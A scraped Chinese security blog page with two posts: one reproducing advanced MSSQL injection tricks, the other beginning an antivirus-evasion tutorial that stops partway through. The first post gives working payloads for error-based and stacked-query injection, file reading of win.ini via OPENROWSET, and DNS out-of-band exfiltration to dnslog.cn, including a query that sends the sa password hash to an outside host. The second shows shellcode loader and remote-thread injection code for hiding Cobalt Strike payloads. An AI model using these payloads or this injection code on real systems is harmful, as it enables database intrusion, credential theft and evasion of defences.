                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-11-19 15:20:27" itemprop="dateModified" datetime="2020-11-19T15:20:27+08:00">2020-11-19</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​    最近看到国外一篇关于<a href="https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/" target="_blank" rel="noopener">mssql注入利用</a>的文章，里面用了很多技巧我之前一直不知道，所以自己对这些技巧进行了复现,本次测试的环境为SQLSERVER2008</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>​    之前对于SQLSERVER报错注入理解仅限于类型转换导致的报错的利用方法，这次看到有很多新的函数可以进行报错注入利用，我把每个函数的测试单独取出来进行测试。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SUSER_NAME()</span><br><span class="line">USER_NAME()</span><br><span class="line">PERMISSIONS()</span><br><span class="line">DB_NAME()</span><br><span class="line">FILE_NAME()</span><br><span class="line">TYPE_NAME()</span><br><span class="line">COL_NAME()</span><br></pre></td></tr></table></figure>

<p>​        SUSER_NAME()函数本来的作用是通过用户的id返回用户名,那id是int型的，由于我们输入的语句返回结果是varchar类型，因此会导致类型转换异常和报错，如下所示：</p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113165830418.png" alt="image-20201113165830418"></p>
<p>​    我们已经可以看到报错了，但是如果想要获取更多的信息怎么办，还能通过这个函数来进行报错注入的利用吗？可以的，语句如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SUSER_NAME((select @@version))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113170131763.png" alt="image-20201113170131763"></p>
<p>获取表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SUSER_NAME((select top 1 table_name from information_schema.tables))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113170346115.png" alt="image-20201113170346115"></p>
<p>上面是直接执行的结果，如果我们放到具体的注入语句里该怎么用？使用方法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tn_Attitudes where id &#x3D;1 and 1&#x3D;SUSER_NAME(@@version)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172402013.png" alt="image-20201113172402013"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172434689.png" alt="image-20201113172434689"></p>
<p>​    其他函数的用法类似，所以不一一说明了，下面给出利用的截图</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;USER_NAME((select top 1 table_name from information_schema.tables))	</span><br><span class="line">and 1&#x3D;PERMISSIONS((select top 1 table_name from information_schema.tables))	</span><br><span class="line">and 1&#x3D;DB_NAME((select top 1 table_name from information_schema.tables))	</span><br><span class="line">and 1&#x3D;FILE_NAME((select top 1 table_name from information_schema.tables))	</span><br><span class="line">and 1&#x3D;TYPE_NAME((select top 1 table_name from information_schema.tables))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172656283.png" alt="image-20201113172656283"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172708675.png" alt="image-20201113172708675"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172721793.png" alt="image-20201113172721793"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172733723.png" alt="image-20201113172733723"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172755049.png" alt="image-20201113172755049"></p>
<pre><code>最后一个函数COL_NAME有一点不一样，需要两个参数</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;COL_NAME((select top 1 table_name from information_schema.tables),1)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172912410.png" alt="image-20201113172912410"></p>
<p>​    这些函数都有一个特性，就是他们输入的值都为int，返回值为varchar，我们可以利用这个特征去找其他可能导致报错注入的函数，之所以要了解这些函数，我们可以在利用报错注入某些函数被拦截的时候，通过替换为其他函数的方式来利用报错注入。</p>
<h2 id="快速获取数据的小技巧"><a href="#快速获取数据的小技巧" class="headerlink" title="快速获取数据的小技巧"></a>快速获取数据的小技巧</h2><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>​    我个人觉得MSSQL的报错注入比较鸡肋，因为MSSQL注入点一般都会支持堆叠查询，通过报错注入获取数据的速度远不如堆叠注入获取数据的速度快，这里我给出堆叠注入快速获取数据的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @listStr VARCHAR(MAX) DECLARE @myoutput VARCHAR(MAX) SET @listStr &#x3D; &#39;&#39; SELECT @listStr &#x3D; @listStr + Name + &#39;,&#39; FROM master..sysdatabases SELECT @myoutput &#x3D; SUBSTRING(@listStr , 1, LEN(@listStr)-1) SELECT CAST(@myoutput as int)  列出所有数据库</span><br><span class="line"></span><br><span class="line">DECLARE @listStr VARCHAR(MAX) DECLARE @myoutput VARCHAR(MAX)  SET @listStr &#x3D; &#39;&#39; SELECT @listStr &#x3D; @listStr + Name + &#39;,&#39; FROM 数据库名..sysobjects WHERE type &#x3D; &#39;U&#39; SELECT @myoutput &#x3D; SUBSTRING(@listStr , 1, LEN(@listStr)-1) SELECT CAST(@myoutput as int)  列出所有的表</span><br><span class="line"></span><br><span class="line">DECLARE @listStr VARCHAR(MAX) DECLARE @myoutput VARCHAR(MAX) SET @listStr &#x3D; &#39;&#39; SELECT @listStr &#x3D; @listStr + Name + &#39;,&#39; FROM 数据库名..syscolumns WHERE id&#x3D;object_id(&#39;表名&#39;) SELECT @myoutput &#x3D; SUBSTRING(@listStr , 1, LEN(@listStr)-1) select cast(@myoutput as int) </span><br><span class="line">列出所有的列</span><br></pre></td></tr></table></figure>

<p>获取所有数据库</p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113173622807.png" alt="image-20201113173622807"></p>
<p>获取所有表名</p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113173643045.png" alt="image-20201113173643045"></p>
<p>获取所有列名</p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113173732520.png" alt="image-20201113173732520"></p>
<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>​    在MSSQL 2016及以后支持使用FOR JSON AUTO函数，我们可以使用这个函数结合联合查询获取数据,由于我本地的数据库版本比较低，所以复现不了这种利用方式，这里给出作者的Payload和截图</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vuln.app&#x2F;getItem?id&#x3D;1&#39;+and+1&#x3D;(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113200720930.png" alt="image-20201113200720930"></p>
<h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><p>​    还是由于环境的问题，无法复现这种利用方式，给出作者的payload和截图</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vuln.app&#x2F;getItem?id&#x3D;1&#39;+and+1&#x3D;(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113201003499.png" alt="image-20201113201003499"></p>
<h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a><strong>文件读取</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT BulkColumn FROM OPENROWSET(BULK N&#39;C:\Windows\win.ini&#39;, SINGLE_BLOB) as document</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119114708244.png" alt="image-20201119114708244"></p>
<p>​    我尝试在报错注入中用到这种方法，但是并没有成功利用，但是可以在union联合查询中利用该方法读取文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tn_AtUsers where id&#x3D;-1 union select  null,(SELECT BulkColumn FROM OPENROWSET(BULK N&#39;C:\Windows\win.ini&#39;, SINGLE_BLOB) as document),null,null</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119115448908.png" alt="image-20201119115448908"></p>
<h2 id="获取当前正在执行的语句"><a href="#获取当前正在执行的语句" class="headerlink" title="获取当前正在执行的语句"></a>获取当前正在执行的语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119115716185.png" alt="image-20201119115716185"></p>
<p>​    这种语句在报错注入中仍然是有效的</p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119115821821.png" alt="image-20201119115821821"></p>
<h2 id="DNS注入"><a href="#DNS注入" class="headerlink" title="DNS注入"></a>DNS注入</h2><p>​    通过fn_xe_file_target_read_file加载UNC路径请求DNS,虽然这个函数第一个和第二个参数都是文件路径，但实际上会先去请求第一个参数对应的路径，所以一般情况下最好用第一个参数加载执行，当我们多次请求同一个UNC路径，只会执行第一次，所以每次执行完后，最好将前面的路径稍微改一下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from fn_xe_file_target_read_file(&#39;\\1a.idbfh8.dnslog.cn\1.xem&#39;,&#39;1.xem&#39;,null,null)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119133707689.png" alt="image-20201119133707689"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119133712427.png" alt="image-20201119133712427"></p>
<p>​    在什么情况下可以用fn_xe_file_target_read_file的第二个参数进行利用呢，答案是当第一个参数指定的路径存在的情况下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from fn_xe_file_target_read_file(&#39;c:\windows\win.ini&#39;,&#39;\\jtf50t.dnslog.cn\1.xem&#39;,null,null)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119133934287.png" alt="image-20201119133934287"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119133951324.png" alt="image-20201119133951324"></p>
<p>​    我测试了报错注入和UNION下利用这种方式外带数据，都是不行的，但在where后添加EXISTS函数执行是可以的,这里有一个小坑，<strong>就是and前面的参数的内容必须是存在的，才会执行DNS请求，否则不会执行成功。</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tn_AuditItems where DisplayOrder&#x3D;121 and exists(select * from fn_xe_file_target_read_file(&#39;\\1a.myg9zc.dnslog.cn\1.xem&#39;,&#39;1.xem&#39;,null,null))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119141927943.png" alt="image-20201119141927943"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119141953818.png" alt="image-20201119141953818"></p>
<p>​    还有一个问题是我们如果想要利用这种方式外带数据，该怎么利用，这个语句因为出现了+号，所以在get提交时需要注意URL编码的问题。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tn_AuditItems where DisplayOrder&#x3D;121 and exists(select * from fn_xe_file_target_read_file(&#39;\\&#39;+(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name&#x3D;&#39;sa&#39;)+&#39;.myg9zc.dnslog.cn\1.xem&#39;,&#39;1.xem&#39;,null,null))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119142531471.png" alt="image-20201119142531471"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119142548412.png" alt="image-20201119142548412"></p>
<p>​        和fn_xe_file_target_read_file类似的函数还有fn_get_audit_file，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from fn_get_audit_file(&#39;\\zwbqeg.dnslog.cn\11.xxx&#39;,default,default)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119142900030.png" alt="image-20201119142900030"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119142908659.png" alt="image-20201119142908659"></p>
<p>​    作者还提供了fn_trace_gettable函数，不过这种利用方式我并没有复现成功。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    对于该作者挖掘到这些关于注入利用的函数，我们肯定也在想他是如何找到这些函数的，这里我大致做一下分析。</p>
<p><strong>报错注入函数</strong></p>
<p>​    我查阅了一些资料，这些函数都有一些共同点，就是接收的参数是int型的参数，并且返回值是varchar类型，如果我们想要挖掘其他的可以报错的函数，可以寻找这种类型的函数。</p>
<p><strong>DNS注入函数</strong></p>
<p>​    DNS外带数据的函数也比较明显，就是他们都是文件操作的函数，也就是说会进行文件读取操作的函数，那如果给这些函数的参数传入UNC路径的内容，就可能会存在DNS请求。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/" class="post-title-link" itemprop="url">关于免杀的技术总结（-）</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-11-09 20:26:00" itemprop="dateCreated datePublished" datetime="2020-11-09T20:26:00+08:00">2020-11-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-11-11 19:36:50" itemprop="dateModified" datetime="2020-11-11T19:36:50+08:00">2020-11-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%85%8D%E6%9D%80/" itemprop="url" rel="index">
                    <span itemprop="name">免杀</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​    在钓鱼或者渗透的过程中，如果我们不会免杀，使用Cobaltstrike生成的exe可能直接就被干掉了，还会触发目标的告警，导致之前的工作前功尽弃，因此在往更高阶的攻防对抗中，免杀能力是必不可少的能力，不是说每个人都必须掌握这种能力，但是如果一个团队中，一个会免杀的人都没有，那就很僵了。</p>
<p>​    回到正题，本片文章并不会讲到免杀方法可能很多已经都不可用了，之所以写这篇总结文章，是希望大家能对免杀的方法能有一个系统的认知。</p>
<h2 id="远程线程调用"><a href="#远程线程调用" class="headerlink" title="远程线程调用"></a>远程线程调用</h2><p>​    要讲远程线程调用，我们首先看一下本地的调用，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &quot;Windows.h&quot;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	unsigned char shellcode[] &#x3D;&quot;shellcode&quot;;</span><br><span class="line">	void *exec &#x3D; VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	memcpy(exec, shellcode, sizeof shellcode);</span><br><span class="line">	((void(*)())exec)();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    上面的代码中用到了几个函数，我大致讲一下：</p>
<p><strong>VirtualAlloc</strong></p>
<p>​    VirtualAlloc函数通常可以用来分配大块的指定大小的内存，它包含如下参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参数一：要分配的内存区域的地址</span><br><span class="line">参数二：要分配的大小</span><br><span class="line">参数三：要分配的类型 当使用MEM_COMMIT时，代表分配物理内存，并初始化为0，</span><br><span class="line">参数四：内存的初始保护属性 当设置为PAGE_EXECUTE时，代表这个区域的代码可执行，但不可读写。</span><br></pre></td></tr></table></figure>

<p>​    也就是当我们执行VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE)时，就会给我们分配大小为sizeof shellcode大小的内存块，并且初始化为0，并且该内存具有执行权限。</p>
<p>​    我做了一个测试，下面执行后我们分配的地址是0x009e0000</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201109204919240.png" alt="image-20201109204919240"></p>
<p>​    我们查看这个地址，可以看到这个地址确实被分配了一大块的内存，并且内容为空。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201109205007124.png" alt="image-20201109205007124"></p>
<p><strong>memcpy</strong></p>
<p>​    memcpy用来从str2中赋值n个字节数据到str1中。其中str1和str2的类型为指针类型。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void *memcpy(void *str1, const void *str2, size_t n)</span><br></pre></td></tr></table></figure>

<p>​    知道了这个以后，我们就可以知道，当执行memcpy(exec, shellcode, sizeof shellcode) 时，会将长度为sizeof shellcode内容为shellcode的内容复制到exec这个指针所指的位置。</p>
<p>​    shellcode指针指向的地址为0x005cfadc，地址内容如下：</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201109205508511.png" alt="image-20201109205508511"></p>
<p>​    当执行完memcpy后，我们可以看到，将0x005cfadc内存中的部分数据拷贝到了0x009e0000内存中。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201109205618924.png" alt="image-20201109205618924"></p>
<p>​    最后我们再看下((void(*)())exec)()大致的意思是将exec这个指针强制转换为函数指针，然后调用这个函数，最终我们的代码得到了执行。</p>
<p>​    我们再来看一下远程线程注入的代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;Windows.h&quot;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	unsigned char shellcode[] &#x3D;&quot;shellcode&quot;;</span><br><span class="line">	HANDLE processHandle;</span><br><span class="line">	HANDLE remoteThread;</span><br><span class="line">	PVOID remoteBuffer;</span><br><span class="line">	printf(&quot;Injecting to PID: %i&quot;, atoi(argv[1]));</span><br><span class="line">	processHandle &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));</span><br><span class="line">	remoteBuffer &#x3D; VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);</span><br><span class="line">	remoteThread &#x3D; CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);</span><br><span class="line">	CloseHandle(processHandle);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    在上面的代码中，同样调用了几个windows函数，想要理解上面的代码做了什么，首先需要了解这几个windows 函数的功能。</p>
<p><strong>OpenProcess</strong></p>
<p>​    OpenProcess用来打开一个已经存在的进程对象，并返回进程的句柄，这个函数的原型如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HANDLE OpenProcess(</span><br><span class="line">DWORD dwDesiredAccess, &#x2F;&#x2F;访问权限（标志）</span><br><span class="line">BOOL bInheritHandle, &#x2F;&#x2F; 是否继承句柄</span><br><span class="line">DWORD dwProcessId&#x2F;&#x2F; 进程标示符</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>dwDesiredAccess代表获取的访问权限，PROCESS_ALL_ACCESS代表获取所有权限。bInheritHandle代表是否继承句柄为boolean类型，dwProcessId代表进程的id。penProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])))的意思就是获取进程id为argv[1]的进程对象的所有的权限，并返回进程的句柄。</p>
<p><strong>VirtualAllocEx</strong></p>
<p>​    通过这个函数，我们可以在我们获取的进程对象中分配内存。</p>
